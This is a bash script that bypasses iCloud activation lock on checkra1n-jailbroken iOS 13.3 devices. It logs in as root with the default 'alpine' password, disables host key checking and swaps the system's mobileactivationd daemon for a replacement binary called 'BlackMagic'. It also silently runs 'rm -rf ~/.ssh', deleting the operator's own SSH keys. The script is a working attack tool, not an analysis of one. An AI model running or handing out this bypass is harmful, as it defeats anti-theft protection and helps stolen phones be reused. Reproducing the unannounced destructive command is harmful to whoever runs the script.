#!/bin/bash

# wrote on a ubuntu based distro
# tested on iOS 13.3.0 & 13.3.1
# required the following paquages: ssh, scp, sshpass, iproxy

# make sure to run checkra1n before proceeding to the bypass
# 1) make a backup of mobileactivationd
# 2) upload bypass file to mobileactivationd
# 3) add required privilege to mobileactivationd
# 4) reload mobileactivationd plist to apply bypass

g=alpine
a=root@localhost
e=1337

rm -rf ~/.ssh
gnome-terminal --tab -- /bin/bash -c "iproxy ${e} 44"
echo "Starting in 3 sec..."
sleep 3s

sshpass -p $g ssh -o StrictHostKeyChecking=no $a -p $e mount -o rw,union,update /
sshpass -p $g ssh -o StrictHostKeyChecking=no $a -p $e mv /usr/libexec/mobileactivationd /usr/libexec/mobileactivationdbak
sshpass -p $g scp -rP $e -o StrictHostKeyChecking=no ./BlackMagic $a:/usr/libexec/mobileactivationd
sshpass -p $g ssh -o StrictHostKeyChecking=no $a -p $e chmod 755 /usr/libexec/mobileactivationd
sshpass -p $g ssh -o StrictHostKeyChecking=no $a -p $e launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist
sshpass -p $g ssh -o StrictHostKeyChecking=no $a -p $e launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist
clear
echo "Bypass done !"
